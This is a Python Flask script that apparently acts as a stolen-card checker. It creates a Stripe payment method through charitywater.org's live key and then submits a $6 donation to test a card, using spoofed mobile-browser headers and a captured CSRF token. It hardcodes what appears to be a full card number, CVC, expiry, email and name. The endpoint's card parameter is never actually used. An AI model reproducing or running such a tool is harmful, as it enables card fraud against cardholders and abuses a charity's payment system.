from flask import Flask, request, jsonify
import requests
import threading
from queue import Queue

app = Flask(__name__)

# Define the headers and data for the first request
headers1 = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
}

data1 = 'type=card&billing_details[address][postal_code]=10080&billing_details[address][city]=&billing_details[address][country]=US&billing_details[address][line1]=&billing_details[email]=baign0864%40gmail.com&billing_details[name]=Frank+Jamej&card[number]=5328390117949817&card[cvc]=262&card[exp_month]=02&card[exp_year]=28&guid=131456de-f3eb-4cda-ae67-c5d2a523334de8534e&muid=72bcddaf-a5ec-4fcd-a4b2-4a50f3c944553d0a86&sid=ee25a7a4-84e5-46a9-9032-1bb65cd91f65d45f57&payment_user_agent=stripe.js%2Fe7a746c3ca%3B+stripe-js-v3%2Fe7a746c3ca%3B+card-element&referrer=https%3A%2F%2Fwww.charitywater.org&time_on_page=81662&client_attribution_metadata[client_session_id]=ed158115-44d1-4c38-9ea1-e02cff65b3ef&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51049Hm4QFaGycgRKpWt6KEA9QxP8gjo8sbC6f2qvl4OnzKUZ7W0l00vlzcuhJBjX5wyQaAJxSPZ5k72ZONiXf2Za00Y1jRrMhU'

# Define the headers and data for the second request
headers2 = {
    'authority': 'www.charitywater.org',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://www.charitywater.org',
    'referer': 'https://www.charitywater.org/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    'x-csrf-token': '4KtXpz6X_fnPzzUqtqgnwwW6oX-eHpuLEVBiP397Cx7ySM5vYuWu8ma-nKjWf0HDLJjzN_yUoXjROweqkhw_0g',
    'x-requested-with': 'XMLHttpRequest',
}

# Queue to hold tasks
task_queue = Queue()

# Dictionary to store responses
responses = {}

# Function to process tasks
def process_task():
    while True:
        url, headers, data = task_queue.get()
        if url == 'exit':
            break
        response = requests.post(url, headers=headers, data=data)
        responses[url] = response.text
        task_queue.task_done()

# Start multiple threads to handle tasks
num_threads = 10  # You can adjust the number of threads as needed
for _ in range(num_threads):
    threading.Thread(target=process_task, daemon=True).start()

@app.route('/cc=<cc>', methods=['GET', 'POST'])
def handle_payment(cc):
    print(f"Received request for CC: {cc}")
    # Format the credit card details
    cc_details = f"{cc}|02|2028|262"

    # First request to Stripe
    url1 = 'https://api.stripe.com/v1/payment_methods'
    r1 = requests.post(url1, headers=headers1, data=data1)
    id = r1.json()['id']

    # Define data2 within the function scope
    data2 = (f'country=us&payment_intent%5Bemail%5D=baign0864%40gmail.com&payment_intent%5Bamount%5D=6&payment_intent%5Bcurrency%5D=usd&payment_intent%5Bmetadata%5D%5Bdonation_kind%5D=water&payment_intent%5Bpayment_method%5D={id}&disable_existing_subscription_check=false&donation_form%5Bamount%5D=6&donation_form%5Banonymous%5D=true&donation_form%5Bcomment%5D=&donation_form%5Bdisplay_name%5D=&donation_form%5Bemail%5D=baign0864%40gmail.com&donation_form%5Bname%5D=Frank&donation_form%5Bpayment_gateway_token%5D=&donation_form%5Bpayment_monthly_subscription%5D=false&donation_form%5Bsurname%5D=Jamej&donation_form%5Bcampaign_id%5D=a5826748-d59d-4f86-a042-1e4c030720d5&donation_form%5Bsetup_intent_id%5D=&donation_form%5Bsubscription_period%5D=&donation_form%5Bmetadata%5D%5Bdonation_kind%5D=water&donation_form%5Bmetadata%5D%5Bexperiments%5D%5Bexperiment_4516166304006144%5D%5Bexperiment_id%5D=4516166304006144&donation_form%5Bmetadata%5D%5Bexperiments%5D%5Bexperiment_4516166304006144%5D%5Bexperiment_name%5D=(Patch)+Agitated+Donation+Form&donation_form%5Bmetadata%5D%5Bexperiments%5D%5Bexperiment_4516166304006144%5D%5Bvariant_name%5D=Variation+%231&donation_form%5Bmetadata%5D%5Bexperiments%5D%5Bexperiment_5969511162052608%5D%5Bexperiment_id%5D=5969511162052608&donation_form%5Bmetadata%5D%5Bexperiments%5D%5Bexperiment_5969511162052608%5D%5Bexperiment_name%5D=2025+September+Campaign+-+Homepage+Copy+Test&donation_form%5Bmetadata%5D%5Bexperiments%5D%5Bexperiment_5969511162052608%5D%5Bvariant_name%5D=Variation+%231&donation_form%5Bmetadata%5D%5Bemail_consent_granted%5D=true&donation_form%5Bmetadata%5D%5Bfull_donate_page_url%5D=https%3A%2F%2Fwww.charitywater.org%2F&donation_form%5Bmetadata%5D%5Bphone_number%5D=&donation_form%5Bmetadata%5D%5Bplaid_account_id%5D=&donation_form%5Bmetadata%5D%5Bplaid_public_token%5D=&donation_form%5Bmetadata%5D%5Buk_eu_ip%5D=false&donation_form%5Bmetadata%5D%5Burl_params%5D%5Btouch_type%5D=1&donation_form%5Bmetadata%5D%5Bsession_url_params%5D%5Btouch_type%5D=1&donation_form%5Bmetadata%5D%5Bwith_saved_payment%5D=false&donation_form%5Baddress%5D%5Baddress_line_1%5D=&donation_form%5Baddress%5D%5Baddress_line_2%5D=&donation_form%5Baddress%5D%5Bcity%5D=&donation_form%5Baddress%5D%5Bcountry%5D=&donation_form%5Baddress%5D%5Bzip%5D=')

    # Second request to Charity Water
    url2 = 'https://www.charitywater.org/donate/stripe'
    data2 = data2.format(id=id)
    task_queue.put((url2, headers2, data2))

    # Wait for the task to be processed
    while url2 not in responses:
        pass

    return jsonify({
        'message': 'Payment processed',
        'stripe_id': id,
        'response_2': responses[url2]
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
